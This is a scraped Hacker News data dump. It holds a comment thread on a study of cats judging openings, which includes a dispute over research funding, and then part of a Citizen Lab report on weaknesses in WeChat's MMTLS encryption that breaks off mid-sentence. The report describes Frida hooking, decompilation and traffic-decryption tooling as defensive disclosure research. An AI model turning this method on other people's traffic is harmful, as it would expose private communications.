hoax, probably one of the first ones reaching the first generation of internet users. But lots of people fell for it. reply runxel 2 hours agoprevOh but that is old news! \"On the Rheology of Cats\": https://www.drgoulu.com/wp-content/uploads/2017/09/Rheology-... reply ChoHag 2 hours agoparentNow that is what a dry academic paper about cats is supposed to look like. Cat pictures on every page. reply jmspring 3 hours agoprevHaving 7 cats, they are all different. My oldest mail holds himself rigid. The youngest male - still a kitten - is a noodle of murder and destruction. reply zafka 2 hours agoparentNice Description. A black noodle just joined our other 5 cats. reply jmspring 2 hours agorootparentBlack cats are the best. She is one of two sisters (oldest cats at 9 at this point). 17 pounds of chunk loving. Annoying as all get out, but will literally roll around on the arm of the couch and “accidentally” drop into my lap. My wife and I go between two locations, today will be the first time 4 of the cats meet the murder noodle. reply stef25 3 hours agoprevThere's no mention of their whiskers, I was under the impression that this is what they use to become aware of their body size in tight spaces. reply dist-epoch 2 hours agoparentWiskers are mentioned, but using the scientific name - vibrissae reply sandebert 2 hours agoprevThis seems relevant: https://play.google.com/store/apps/details?id=com.lastquarte... reply pugworthy 2 hours agoprevThe overhead view of figure 3 in particular is noteworthy to me. The 3 human subjects are represented as abstract ovals, and the cat drawn as a cat who is staring up as if to look through the fourth ceiling at the reader. The reader becomes, in a sense, a greeble. This paper would have been a fun project for a scientific illustrator. reply mytailorisrich 13 minutes agoprevAnecdotally my cat is always very cautious before going through cat flags, which are not particularly narrow but very short, but never hesitate to run into narrow but deep stuff... reply damontal 3 hours agoprevThis sounds like something Karl Pilkington would come up with. reply tencentshill 3 hours agoprevI wonder if the same experiment could be done with big cats - Would an opening that touches the mane of a lion have the same results? reply wildylion 1 hour agoparentThe cat will just get annoyed - it's a shaggy tangly thing that always gets in the way. Speaking from personal experience >:3 reply carabiner 1 hour agoprevThis is why they flow out of our grasp. reply 0x1ceb00da 3 hours agoprevWe need a documentary. reply dekhn 3 hours agoprevSee also: https://www.youtube.com/watch?v=4z30eLocTnU reply joshuamcginnis 3 hours agoprevnext [13 more] [flagged] t-3 3 hours agoparent\"Almost\" is a bit vague and probably too strong, but they are mostly water, just like other mammals. reply krapp 3 hours agorootparentTherefore they are more properly classified as soups. reply maxbond 3 hours agorootparentNoted ontologist Pirate Software would argue that cats are a Wellington, not a soup. https://youtube.com/shorts/MnAegCmJ7Xk reply orangeartist 2 hours agorootparentI'm surprised to see this guy show up in a positive light after his false flagging campaign. reply sleazebreeze 1 hour agorootparentWhat false flagging campaign are you referring to? I am not familiar. reply orangeartist 1 hour agorootparentHe's taken down at least a dozen videos criticizing him by using his position as a youtuber with a million+ subscribers. Originally it was just videos referencing his \"maldavius figtree\" fursona, but now it's anything that portrays him in a negative way. reply krapp 2 hours agorootparentprevI can't refute his logic. reply fluoridation 2 hours agorootparentprevSave for their skeletons and other dry structures like hair and shells, animals are in fact gels. reply WJW 1 hour agorootparentMaybe they're more broth-like? Also the paper at https://www.drgoulu.com/wp-content/uploads/2017/09/Rheology-... seems to indicate that they are \"active rheological materials\" and therefore probably non-Newtonian. reply joshuamcginnis 3 hours agorootparentprevThat's a lot of ambiguity for a scientific paper. Even if it's true (Cats are about 60-70% water), that's not the point of the title. I suspect its because it makes for a catchy headline. reply aithrowawaycomm 16 minutes agorootparentCatchy headline, but also in a fluid in a dynamical sense - cats \"flow\" into spaces when exploring by trial-and-error testing openings with their body size, but they are also only \"almost\" liquid in that for especially narrow openings they are reluctant to poke their heads in, presumably because they might get stuck. The contrast with dogs in the introduction is instructive: dogs tend to hunt over open fields rather than chasing prey into narrow dens, so it makes sense they would tend to make conservative eyeball judgments about whether they can fit into certain spaces. But cats will try to corner their prey in a tunnel/etc, so they have good reason to rely more on touch and experimentation (\"ecologically-valid strategy\"). reply accrual 3 hours agorootparentprevI agree. I think it's a bit of nod into the playfulness most associate with cats. I don't mind though, cats are one subject I'm okay with some leeway in the rigorousness of the article title. reply joshuamcginnis 4 hours agoprevnext [36 more] [flagged] loloquwowndueo 4 hours agoparentThe early networks that evolved into the modern Internet were mostly paid for with public funds, and they’re used nowadays mostly to watch cat videos. I don’t see anyone complaining about that /) reply brnaftr361 3 hours agorootparentI complain about it frequently, actually, in context of commercial use and the \"commons\" the Internet is founded on. These things also don't compare. reply joshuamcginnis 3 hours agorootparentprevComparing the advent of the internet with a study on the flexibility and agility of cats in tight spaces isn't exactly apples to apples. reply exe34 3 hours agorootparentno, it might lead to better surgery robots, search and rescue robots, and countless things that I'm not even capable of imagining. you are the one comparing apples to oranges - the internet has been around for 50 years and has shown its value - this one has just been published! reply klibertp 1 hour agorootparent> no, it might lead to better surgery robots, search and rescue robots, No, that's extremely optimistic, at best. We've learned that cats seem to use their knowledge of their height but not width when choosing to go (or not) through a hole. That's it. We're promised follow-up research because it might be that, other than height, they also know and use their additional characteristics, like weight. That's all. Are you seriously suggesting this knowledge might be helpful in building \"surgery robots\"? > and countless things that I'm not even capable of imagining. Maybe. Are the chances of that enough to justify the expense? Couldn't this work be done more cost-effectively (it's about cats - the world is filled with guys who would do all the experiments for free, given instructions, just for their cat(s) to be in a scientific study...)? Especially since we're talking about Hungary, which is not a super-rich nation. In any case, allocating funds for research is probably a very hard problem, and I know nothing about it. Still, questioning the expenses is something any taxpayer should be able to do. Just give me good reasons why it had to cost $120k to feed 30 cats for a few weeks, and I'll be happily on my way. reply joshuamcginnis 3 hours agorootparentprevWhat I'm trying to call out is that not all studies are equally valuable nor should they all be publicly funded. Would you at least agree me on that? reply fluoridation 3 hours agorootparentBut how can you know ahead of time which studies are valuable and which are less so? What about metastudies? How do you quantify their worth? reply joshuamcginnis 3 hours agorootparentThose are great questions worthy of debate. But we shouldn't just give up on those hard questions and say that all research is worthy of public funding should we? reply fluoridation 3 hours agorootparentEh. It's not like research funding is unlimited. Institutions get a budget and they spend it on research projects how they see fit. reply exe34 3 hours agorootparentprevpublic funds are allocated by multiple experts in various fields checking applications are in line with government policy. if you think you can do better, I'd encourage you to run for election and set different policies. from what I can see, the system is working as intended. reply joshuamcginnis 3 hours agorootparentHN literally posted a video on how broken the public funding system is (in Physics) days ago: https://news.ycombinator.com/item?id=41808127 This broken system doesn't just stop at Physics. If you watch the video, she does a great job at explaining what exactly is broken. I'd love you to watch that video and then come back and explain to me why she is wrong and why the system is actually working well and as-intended. reply exe34 1 hour agorootparentI've seen the video - to be fair, theoretical physics is probably the cheapest thing to fund - they just need a supply of chalk. ultimately a lot of physics is a jobs program to keep physicists from going abroad and working on a foreign nuclear program. seriously though, you should run for election on this platform! reply Y-bar 3 hours agoparentprevNKFIH, grant # K143077 is not for this study specifically, searching for it reveals a number of studies the same grant supported, such as: https://figshare.com/articles/media/You_talkin_to_me_Functio... and https://www.sciencedirect.com/science/article/pii/S000632072... reply joshuamcginnis 3 hours agorootparentThat's right. This study falls under the parent grant entitled: > Péter Pongrácz: The human as a limited resource - a new paradigm to understand social behavior in dogs (Eötvös Loránd University) reply bayindirh 3 hours agoparentprevWhen asking these kinds of questions, I always remind myself \"The Usefulness of Useless Knowledge\" [0]. On the other hand, I believe that researching how animals think, behave and \"work\" in general, is a very important part of being human. They're alive, too, and they defy tons of prejudice we have about them over and over. We need to revise tons of knowledge about animals and other living things, in general. [0]: https://www.ias.edu/sites/default/files/library/UsefulnessHa... reply joshuamcginnis 3 hours agorootparentSo what exactly is your criteria for when a study should or should not be publicly funded? reply bayindirh 3 hours agorootparentGood question. I think if there's a large corpus of research supporting a hypothesis, any research retrying that hypothesis in an insignificant way can be disqualified from funding. If you challenge the hypothesis, or adding something significant to the dark areas of that hypothesis, you could be funded. Moreover, if your research fails to prove that hypothesis, or proves the exact opposite, that should be also printed/published somewhere, because failing is equally important in science. In short, tell us something we don't know in a provable way. That's it. This is what science is. This is what I think with about your question with my Sysadmin/Researcher/Ph.D. hats combined. reply joshuamcginnis 3 hours agorootparentThanks for your kind response! Are you familiar with the Replication Crisis? What happens when most of the \"hypothesis\" being challenged can't be rightly replicated in the first place? And what happens when the primary means of funding is attached the volume of papers and not the quality or impact, as is what I believe to be the case generally here in the US? https://en.wikipedia.org/wiki/Replication_crisis reply bayindirh 3 hours agorootparentHey, no problem. Yes, I'm familiar with it, and I work in/with projects which aims to create reproducible research (Galaxy, Zenodo, etc.). If you tell me that \"I can make this unreproducible paper reproducible, but with a different process (or the same one), and share all the pipeline from dust to result\", I'll tell you to go for it, and fund you. At the end, if something is not reproducible, and you're testing reproducibility of that thing, it's illuminating a dark area of that hypothesis. Measuring the quality of the research and its impact is not something I'm very familiar with to be honest, and I'm not from US, so I can't tell how universities push their people, however publish or perish is a real problem everywhere in the world. We used to see citation numbers important, then cite-rings cropped up. We valued paper counts, then professors started to lend their names to papers in their areas for \"free\" advisory. Now we have more complex algorithms/methods, and now I'm more of a research institute person than an academic, and I don't know how effective these things are anymore. But hey, I do research for fun and write papers now and then. Just to keep myself entertained to find reasons to learn something new. reply joshuamcginnis 3 hours agorootparentFair enough and all great points. I think we're more aligned than not on the fundamentals here. Folks seem to be reacting negatively to my even propositioning these questions without even having made a judgment on the merit of the study myself. reply bayindirh 3 hours agorootparentYes, we agree in the fundamentals. The reality is, academia dynamics is very different w.r.t. to private sector, esp. startups. So, knowing how research works in academia is a bit of an unknown for people who're not interested in this line of work, or people who doesn't know how these things are done in general. In short, the value proposition for a piece of research is very different depending on the lens you're looking through to that research. reply coldpie 3 hours agorootparentprevWhy are you asking us? I'm not a research scientist/funding expert. There are people whose job it is to decide that, and they decided it was. I trust them to do their jobs, just like they trust me to do my job when they need my services. reply joshuamcginnis 3 hours agorootparentWhy do you trust these people when for the most part, they are unelected bureaucrats serving their own self-interests? reply bayindirh 3 hours agorootparentBecause it's not like that everywhere in the world. For example, here, to be able to get funding, you need to pass a panel interview of researchers who are experienced in the area of your research. Our system employs \"hordes of research experts\" to shake down most inadequate ones, and push the rest to the actual researchers to further filter them. IIRC, many if not most EU countries employ similar methods. reply coldpie 3 hours agorootparentprev> they are unelected bureaucrats serving their own self-interests You seem to be pushing an agenda, not asking questions in good faith. reply joshuamcginnis 3 hours agorootparentMy agenda is that I think it's completely rationale to ask about the merits of publicly funded research and debate that topic. You may not like that question or my responses, but that is my assertion here. reply coldpie 3 hours agorootparent> completely rational to ask about the merits of publicly funded research Sure, but asking asking non-experts on some web forum to make guesses at the answers, and insulting the people whose job it is to do this work based on your assumptions of how it works, is a bad way to go about answering that question. reply tolerance 2 hours agorootparentI was rooting against you in this exchange until you said this , because I took your initial plea for authority to be a cop out from joshmcginnis's argument, because I'm a human and have biases and sometimes put the quality of \"earnestness\" behind my beliefs above others' (i.e., whether I agree with them or not, my counterpart is equally sincere in what they believe in as me). That disposition is unwise and I think my realization of this underpins what I found striking about the comment that you just made. In a way, I think this is what joshmcginnis is guilty of here...but I want to believe that he's aware that he's being provocative, but being provocative is the entire point. Your initial response of deference and the overall response that his comments are receiving from others are decent representations of how the mere questioning of certain institutions (online, pseudonymously, through relatively obscure channels) can be seen as problematic. It is something like social science as performance art. Or the other way around? reply coldpie 2 hours agorootparentThere's an extremely annoying pattern you see a lot, where someone with a naive understanding of an extremely complicated topic will bust in and say \"you are all idiots who are obviously doing it wrong!\" without having any understanding of the deep, complex history of the topic. They think they know better than the experts, because they found what looks like an obvious, surface-level problem. After all, why haven't those idiots noticed this problem and fixed it?? If they're lucky, someone who actually knows what they're talking about will walk them through how it's actually a very complex topic, and what looked like an obvious problem is actually just a visible imperfect outcome of what is the best way we've managed to optimize the problem space. Others in this thread are taking this approach. Bless 'em. But, I think it would be better if people didn't do this in the first place. Research funding is a super complicated topic involving hundreds of people and processes. No, it's not perfect, but it's the best approach we've got. If you want to improve a complex system, you need to go engage with it, understand how it works, understand how the problem occurred (if it even is a problem!), and find a way to fix it without making things worse. This is really hard work! Just busting into a topic and loudly complaining on some random web forum doesn't accomplish anything, except if you're lucky making someone else spoon-feed you the answers you could've found yourself. Usually it's just ignorance, but sometimes it's more sinister, as it is also a useful approach for pushing an agenda to other non-expert readers. \"Look how much money we waste on public science funding! We should reduce that funding. Look at these corrupt self-serving bureaucrats! We should put someone else in charge, and I know just who it should be.\" Hmm... reply tolerance 1 hour agorootparentI agree with you in principle and I wouldn't want to allege the entirety of what you've said to joshuamcginnis's approach or motives. But I agree with you in principle. I can also see how any perceived conflict in the top-down relationship between authoritative institutions and the general population can frustrate a person (i.e., a member of the general populace), especially when the institutions are portrayed as vague identities (\"the experts\") and the complexities that they operate under are a part of a broader network of institutions and entities that themselves seem to thrive under incongruence with respect to the said top-down relationship. So to draw attention to an issue in a frustrating matter, can be seen as a natural human response. At times it may even be necessary. If not, then we reach a point where we wind up denying of their natural inclination to be frustrated with what they perceive to be (and quite often) an injustice to society, irrespective of class distinctions. And a person does not necessarily need to be an \"expert\" to point or argue against that. Not everyone is willing to resign themselves to \"it's the best we've got\", if that's not what they believe and resignation, or willful engagement with a system perceived to be corrupt, is tantamount to affirming the system itself, which is unimaginable and even more frustrating (read: insanity-inducing). I say all of this, assuming good faith and not from the perspective of ill intent or ignorance that you've presented (which again, I agree with in principle). Pardon the commas. reply rootusrootus 3 hours agorootparentprevThis whole thread started because you implied this study was worthless. Would be interested to hear your criteria. reply joshuamcginnis 3 hours agorootparentIt's entirely rational and reasonable for someone to at least ask and receive a decent response to the question, \"Why should my tax dollars have been used to funded this research?\" Academia should have great responses lined up which garner continued support from the public. But the fact that we aren't even allowed to ask questions without immediately being shut down as dissenters of all publicly funded research is problematic. Public research should absolutely be at least partially evaluated by the very people funding it to begin with. reply keybored 3 hours agoparentprevHungarians aren’t brutish optimizers who cut costs and strive for uniformity and blandness; they are not like those philistines that know the cost of everything but the value of nothing. Or else they wouldn’t speak Hungarian. reply brnaftr361 3 hours agoparentprevEven better that it got published in Cell. reply wormlord 3 hours agoparentprevWait until you learn about something called \"the military\" reply anonu 2 hours agoprev [–] Here's the podcast: https://notebooklm.google.com/notebook/52350e74-f4b0-42d9-a1... reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "Cats possess a high level of adaptability, allowing them to navigate narrow spaces with ease, unlike dogs.",
      "Their sensitive whiskers, known as vibrissae, and flexible spines aid in their agility and ability to move through tight spaces.",
      "Cats' behavior and physical traits are shaped by their dual role as predators and prey, seeking enclosed spaces for safety and hunting, contributing to their fluid, liquid-like movements."
    ],
    "points": 153,
    "commentCount": 97,
    "retryCount": 0,
    "time": 1729165380
  },
  {
    "id": 41863278,
    "title": "Should We Chat, Too? Security Analysis of WeChat's Mmtls Encryption Protocol",
    "originLink": "https://citizenlab.ca/2024/10/should-we-chat-too-security-analysis-of-wechats-mmtls-encryption-protocol/",
    "originBody": "ResearchApp Privacy and Controls Should We Chat, Too? Security Analysis of WeChat’s MMTLS Encryption Protocol By Mona Wang, Pellaeon Lin, and Jeffrey Knockel October 15, 2024 閱讀繁體中文摘要 This report’s key findings are translated into Chinese, it has an accompanying FAQ, and the FAQ is translated into Simplified and Traditional Chinese. Key contributions We performed the first public analysis of the security and privacy properties of MMTLS, the main network protocol used by WeChat, an app with over one billion monthly active users. We found that MMTLS is a modified version of TLS 1.3, with many of the modifications that WeChat developers made to the cryptography introducing weaknesses. Further analysis revealed that earlier versions of WeChat used a less secure, custom-designed protocol that contains multiple vulnerabilities, which we describe as “Business-layer encryption”. This layer of encryption is still being used in addition to MMTLS in modern WeChat versions. Although we were unable to develop an attack to completely defeat WeChat’s encryption, the implementation is inconsistent with the level of cryptography you would expect in an app used by a billion users, such as its use of deterministic IVs and lack of forward secrecy. These findings contribute to a larger body of work that suggests that apps in the Chinese ecosystem fail to adopt cryptographic best practices, opting instead to invent their own, often problematic systems. We are releasing technical tools and further documentation of our technical methodologies in an accompanying Github repository. These tools and documents, along with this main report, will assist future researchers to study WeChat’s inner workings. Introduction WeChat, with over 1.2 billion monthly active users, stands as the most popular messaging and social media platform in China and third globally. As indicated by market research, WeChat’s network traffic accounted for 34% of Chinese mobile traffic in 2018. WeChat’s dominance has monopolized messaging in China, making it increasingly unavoidable for those in China to use. With an ever-expanding array of features, WeChat has also grown beyond its original purpose as a messaging app. Despite the universality and importance of WeChat, there has been little study of the proprietary network encryption protocol, MMTLS, used by the WeChat application. This knowledge gap serves as a barrier for researchers in that it hampers additional security and privacy study of such a critical application. In addition, home–rolled cryptography is unfortunately common in many incredibly popular Chinese applications, and there have historically been issues with cryptosystems developed independently of well-tested standards such as TLS. This work is a deep dive into the mechanisms behind MMTLS and the core workings of the WeChat program. We compare the security and performance of MMTLS to TLS 1.3 and discuss our overall findings. We also provide public documentation and tooling to decrypt WeChat network traffic. These tools and documents, along with our report, will assist future researchers to study WeChat’s privacy and security properties, as well as its other inner workings. This report consists of a technical description of how WeChat launches a network request and its encryption protocols, followed by a summary of weaknesses in WeChat’s protocol, and finally a high-level discussion of WeChat’s design choices and their impact. The report is intended for privacy, security, or other technical researchers interested in furthering the privacy and security study of WeChat. For non-technical audiences, we have summarized our findings in this FAQ. Prior work on MMTLS and WeChat transport security Code internal to the WeChat mobile app refers to its proprietary TLS stack as MMTLS (MM is short for MicroMessenger, which is a direct translation of 微信, the Chinese name for WeChat) and uses it to encrypt the bulk of its traffic. There is limited public documentation of the MMTLS protocol. This technical document from WeChat developers describes in which ways it is similar and different from TLS 1.3, and attempts to justify various decisions they made to either simplify or change how the protocol is used. In this document, there are various key differences they identify between MMTLS and TLS 1.3, which help us understand the various modes of usage of MMTLS. Wan et al. conducted the most comprehensive study of WeChat transport security in 2015 using standard security analysis techniques. However, this analysis was performed before the deployment of MMTLS, WeChat’s upgraded security protocol. In 2019, Chen et al. studied the login process of WeChat and specifically studied packets that are encrypted with TLS and not MMTLS. As for MMTLS itself, in 2016 WeChat developers published a document describing the design of the protocol at a high level that compares the protocol with TLS 1.3. Other MMTLS publications focus on website fingerprinting-type attacks, but none specifically perform a security evaluation. A few Github repositories and blog posts look briefly into the wire format of MMTLS, though none are comprehensive. Though there has been little work studying MMTLS specifically, previous Citizen Lab reports have discovered security flaws of other cryptographic protocols designed and implemented by Tencent. Methodology We analyzed two versions of WeChat Android app: Version 8.0.23 (APK “versionCode” 2160) released on May 26, 2022, downloaded from the WeChat website. Version 8.0.21 (APK “versionCode” 2103) released on April 7, 2022, downloaded from Google Play Store. All findings in this report apply to both of these versions. We used an account registered to a U.S. phone number for the analysis, which changes the behavior of the application compared to a mainland Chinese number. Our setup may not be representative of all WeChat users, and the full limitations are discussed further below. For dynamic analysis, we analyzed the application installed on a rooted Google Pixel 4 phone and an emulated Android OS. We used Frida to hook the app’s functions and manipulate and export application memory. We also performed network analysis of WeChat’s network traffic using Wireshark. However, due to WeChat’s use of nonstandard cryptographic libraries like MMTLS, standard network traffic analysis tools that might work with HTTPS/TLS do not work for all of WeChat’s network activity. Our use of Frida was paramount for capturing the data and information flows we detail in this report. These Frida scripts are designed to intercept WeChat’s request data immediately before WeChat sends it to its MMTLS encryption module. The Frida scripts we used are published in our Github repository. For static analysis, we used Jadx, a popular Android decompiler, to decompile WeChat’s Android Dex files into Java code. We also used Ghidra and IDA Pro to decompile the native libraries (written in C++) bundled with WeChat. Notation In this report, we reference a lot of code from the WeChat app. When we reference any code (including file names and paths), we will style the text using monospace fonts to indicate it is code. If a function is referenced, we will add empty parentheses after the function name, like this: somefunction(). The names of variables and functions that we show may come from one of the three following: The original decompiled name. In cases where the name cannot be decompiled into a meaningful string (e.g., the symbol name was not compiled into the code), we rename it according to how the nearby internal log messages reference it. In cases where there is not enough information for us to tell the original name, we name it according to our understanding of the code. In such cases, we will note that these names are given by us. In the cases where the decompiled name and log message name of functions are available, they are generally consistent. Bolded or italicized terms can refer to higher-level concepts or parameters we have named. Utilization of open source components We also identified open source components being used by the project, the two largest being OpenSSL and Tencent Mars. Based on our analysis of decompiled WeChat code, large parts of its code are identical to Mars. Mars is an “infrastructure component” for mobile applications, providing common features and abstractions that are needed by mobile applications, such as networking and logging. By compiling these libraries separately with debug symbols, we were able to import function and class definitions into Ghidra for further analysis. This helped tremendously to our understanding of other non-open-source code in WeChat. For instance, when we were analyzing the network functions decompiled from WeChat, we found a lot of them to be highly similar to the open source Mars, so we could just read the source code and comments to understand what a function was doing. What was not included in open source Mars are encryption related functions, so we still needed to read decompiled code, but even in these cases we were aided by various functions and structures that we already know from the open source Mars. Matching decompiled code to its source In the internal logging messages of WeChat, which contain source file paths, we noticed three top level directories, which we have highlighted below: /home/android/devopsAgent/workspace/p-e118ef4209d745e1b9ea0b1daa0137ab/src/mars/ /home/android/devopsAgent/workspace/p-e118ef4209d745e1b9ea0b1daa0137ab/src/mars-wechat/ /home/android/devopsAgent/workspace/p-e118ef4209d745e1b9ea0b1daa0137ab/src/mars-private/ The source files under “mars” can all be found in the open source Mars repository as well, while source files in the other two top level directories cannot be found in the open source repository. To illustrate, below is a small section of decompiled code from libwechatnetwork.so : XLogger::XLogger((XLogger *)&local_2c8,5,\"mars::stn\", \"/home/android/devopsAgent/workspace/p-e118ef4209d745e1b9ea0b1daa0137ab/src/mars/mars/stn/src/longlink.cc\" ,\"Send\",0xb2,false,(FuncDef0 *)0x0); XLogger::Assert((XLogger *)&local_2c8,\"tracker_.get()\"); XLogger::~XLogger((XLogger *)&local_2c8); From its similarity, is highly likely that this section of code was compiled from this line in the Send() function, defined in longlink.cc file from the open source repository: xassert2(tracker_.get()); Reusing this observation, whenever our decompiler is unable to determine the name of a function, we can use logging messages within the compiled code to determine its name. Moreover, if the source file is from open source Mars, we can read its source code as well. Three parts of Mars In a few articles on the Mars wiki, Tencent developers provided the following motivations to develop Mars: The need for a cross-platform networking library, to reduce the development and maintenance costs of two separate network libraries on Android and iOS. The need to customize parameters of the TCP handshake process, in order for faster connection establishment. According to its developers, Mars and its STN module are comparable to networking libraries such as AFNetworking and OkHttp, which are widely used in other mobile apps. One of the technical articles released by the WeChat development team wrote about the process of open-sourcing Mars. According to the article, they had to separate WeChat-specific code, which was kept private, from the general use code, which was open sourced. In the end, three parts were separated from each other: mars-open: to be open sourced, independent repository. mars-private: potentially open sourced, depends on mars-open. mars-wechat: WeChat business logic code, depends on mars-open and mars-private. These three names match the top level directories we found earlier if we take “mars-open” to be in the “mars” top-level directory. Using this knowledge, when reading decompiled WeChat code, we could easily know whether it was WeChat-specific or not. From our reading of the code, mars-open contains basic and generic structures and functions, for instance, buffer structures, config stores, thread management and, most importantly, the module named “STN” responsible for network transmission. (We were unable to determine what STN stands for.) On the other hand, mars-wechat contains the MMTLS implementation, and mars-private is not closely related to the features within our research scope. As a technical side note, the open source Mars compiles to just one object file named “libmarsstn.so”. However, in WeChat, multiple shared object files reference code within the open source Mars, including the following: libwechatxlog.so libwechatbase.so libwechataccessory.so libwechathttp.so libandromeda.so libwechatmm.so libwechatnetwork.so Our research focuses on the transport protocol and encryption of WeChat, which is implemented mainly in libwechatmm.so and libwechatnetwork.so. In addition, we inspected libMMProtocalJni.so, which is not part of Mars but contains functions for cryptographic calculations. We did not inspect the other shared object files. Matching Mars versions Despite being able to find open source code to parts of WeChat, in the beginning of our research, we were unable to pinpoint the specific version of the source code of mars-open that was used to build WeChat. Later, we found version strings contained in libwechatnetwork.so. For WeChat 8.0.21, searching for the string “MARS_” yielded the following: MARS_BRANCH: HEAD MARS_COMMITID: d92f1a94604402cf03939dc1e5d3af475692b551 MARS_PRIVATE_BRANCH: HEAD MARS_PRIVATE_COMMITID: 193e2fb710d2bb42448358c98471cd773bbd0b16 MARS_URL: MARS_PATH: HEAD MARS_REVISION: d92f1a9 MARS_BUILD_TIME: 2022-03-28 21:52:49 MARS_BUILD_JOB: rb/2022-MAR-p-e118ef4209d745e1b9ea0b1daa0137ab-22.3_1040 The specific MARS_COMMITID (d92f1a…) exists in the open source Mars repository. This version of the source code also matches the decompiled code. Pinpointing the specific source code version helped us tremendously with Ghidra’s decompilation. Since a lot of the core data structures used in WeChat are from Mars, by importing the known data structures, we can observe the non-open-sourced code accessing structure fields, and inferring its purpose. Limitations This investigation only looks at client behavior and is therefore subject to other common limitations in privacy research that can only perform client analysis. Much of the data that the client transmits to WeChat servers may be required for functionality of the application. For instance, WeChat servers can certainly see chat messages since WeChat can censor them according to their content. We cannot always measure what Tencent is doing with the data that they collect, but we can make inferences about what is possible. Previous work has made certain limited inferences about data sharing, such as that messages sent by non-mainland-Chinese users are used to train censorship algorithms for mainland Chinese users. In this report, we focus on the version of WeChat for non-mainland-Chinese users. Our investigation was also limited due to legal and ethical constraints. It has become increasingly difficult to obtain Chinese phone numbers for investigation due to the strict phone number and associated government ID requirements. Therefore, we did not test on Chinese phone numbers, which causes WeChat to behave differently. In addition, without a mainland Chinese account, the types of interaction with certain features and Mini Programs were limited. For instance, we did not perform financial transactions on the application. Our primary analysis was limited to analyzing only two versions of WeChat Android (8.0.21 and 8.0.23). However, we also re-confirmed our tooling works on WeChat 8.0.49 for Android (released April 2024) and that the MMTLS network format matches that used by WeChat 8.0.49 for iOS. Testing different versions of WeChat, the backwards-compatibility of the servers with older versions of the application, and testing on a variety of Android operating systems with variations in API version, are great avenues for future work. Within the WeChat Android app, we focused on its networking components. Usually, within a mobile application (and in most other programs as well), all other components will defer the work of communicating over the network to the networking components. Our research is not a complete security and privacy audit of the WeChat app, as even if the network communication is properly protected, other parts of the app still need to be secure and private. For instance, an app would not be secure if the server accepts any password to an account login, even if the password is confidentially transmitted. Tooling for studying WeChat and MMTLS In the Github repository, we have released tooling that can log keys using Frida and decrypt network traffic that is captured during the same period of time, as well as samples of decrypted payloads. In addition, we have provided additional documentation and our reverse-engineering notes from studying the protocol. We hope that these tools and documentation will further aid researchers in the study of WeChat. Launching a WeChat network request As with any other apps, WeChat is composed of various components. Components within WeChat can invoke the networking components to send or receive network transmissions. In this section, we provide a highly simplified description of the process and components surrounding sending a network request in WeChat. The actual process is much more complex, which we explain in more detail in a separate document. The specifics of data encryption is discussed in the next section “WeChat network request encryption”. In the WeChat source code, each API is referred to as a different “Scene”. For instance, during the registration process, there is one API that submits all new account information provided by the user, called NetSceneReg. NetSceneReg is referred to by us as a “Scene class”, Other components could start a network request towards an API by calling the particular Scene class. In the case of NetSceneReg, it is usually invoked by a click event of a button UI component. Upon invocation, the Scene class would prepare the request data. The structure of the request data (as well as the response) is defined in “RR classes”. (We dub them RR classes because they tend to have “ReqResp” in their names.) Usually, one Scene class would correspond to one RR class. In the case of NetSceneReg, it corresponds to the RR class MMReqRespReg2, and contains fields like the desired username and phone number. For each API, its RR class also defines a unique internal URI (usually starting with “/cgi-bin”) and a “request type” number (an approximately 2–4 digit integer). The internal URI and request type number is often used throughout the code to identify different APIs. Once the data is prepared by the Scene class, it is sent to MMNativeNetTaskAdapter. MMNativeNetTaskAdapter is a task queue manager, it manages and monitors the progress of each network connection and API requests. When a Scene Class calls MMNativeNetTaskAdapter, it places the new request (a task) onto the task queue, and calls the req2Buf() function. req2Buf() serializes the request Protobuf object that was prepared by the Scene Class into bytes, then encrypts the bytes using Business-layer Encryption. Finally, the resultant ciphertext from Business-layer encryption is sent to the “STN” module, which is part of Mars. STN then encrypts the data again using MMTLS Encryption. Then, STN establishes the network transport connection, and sends the MMTLS Encryption ciphertext over it. In STN, there are two types of transport connections: Shortlink and Longlink. Shortlink refers to an HTTP connection that carries MMTLS ciphertext. Shortlink connections are closed after one request-response cycle. Longlink refers to a long-lived TCP connection. A Longlink connection can carry multiple MMTLS encrypted requests and responses without being closed. WeChat network request encryption WeChat network requests are encrypted twice, with different sets of keys. Serialized request data is first encrypted using what we call the Business-layer Encryption, as internal encryption is referred to in this blog post as occurring at the “Business-layer”. The Business-layer Encryption has two modes: Symmetric Mode and Asymmetric Mode. The resultant Business-layer-encrypted ciphertext is appended to metadata about the Business-layer request. Then, the Business-layer requests (i.e., request metadata and inner ciphertext) are additionally encrypted, using MMTLS Encryption. The final resulting ciphertext is then serialized as an MMTLS Request and sent over the wire. WeChat’s network encryption system is disjointed and seems to still be a combination of at least three different cryptosystems. The encryption process described in the Tencent documentation mostly matches our findings about MMTLS Encryption, but the document does not seem to describe in detail the Business-layer Encryption, whose operation differs when logged-in and when logged-out. Logged-in clients use Symmetric Mode while logged-out clients use Asymmetric Mode. We also observed WeChat utilizing HTTP, HTTPS, and QUIC to transmit large, static resources such as translation strings or transmitted files. The endpoint hosts for these communications are different from MMTLS server hosts. Their domain names also suggest that they belong to CDNs. However, the endpoints that are interesting to us are those that download dynamically generated, often confidential resources (i.e., generated by the server on every request) or endpoints where users transmit, often confidential, data to WeChat’s servers. These types of transmissions are made using MMTLS. As a final implementation note, WeChat, across all these cryptosystems, uses internal OpenSSL bindings that are compiled into the program. In particular, the libwechatmm.so library seems to have been compiled with OpenSSL version 1.1.1l, though the other libraries that use OpenSSL bindings, namely libMMProtocalJni.so and libwechatnetwork.so were not compiled with the OpenSSL version strings. We note that OpenSSL internal APIs can be confusing and are often misused by well-intentioned developers. Our full notes about each of the OpenSSL APIs that are used can be found in the Github repository. In Table 1, we have summarized each of the relevant cryptosystems, how their keys are derived, how encryption and authentication are achieved, and which libraries contain the relevant encryption and authentication functions. We will discuss cryptosystem’s details in the coming sections.Key derivation Encryption Authentication Library Functions that perform the symmetric encryption MMTLS, Longlink Diffie-Hellman (DH) AES-GCM AES-GCM tag libwechatnetwork.so Crypt() MMTLS, Shortlink DH with session resumption AES-GCM AES-GCM tag libwechatnetwork.so Crypt() Business-layer, Asymmetric Mode Static DH with fresh client keys AES-GCM AES-GCM tag libwechatmm.so HybridEcdhEncrypt(), AesGcmEncryptWithCompress() Business-layer, Symmetric Mode Fixed key from server AES-CBC Checksum + MD5 libMMProtocalJNI.so pack(), EncryptPack(), genSignature() Table 1: Overview of different cryptosystems for WeChat network request encryption, how keys are derived, how encryption and authentication are performed, and which libraries perform them. 1. MMTLS Wire Format Since 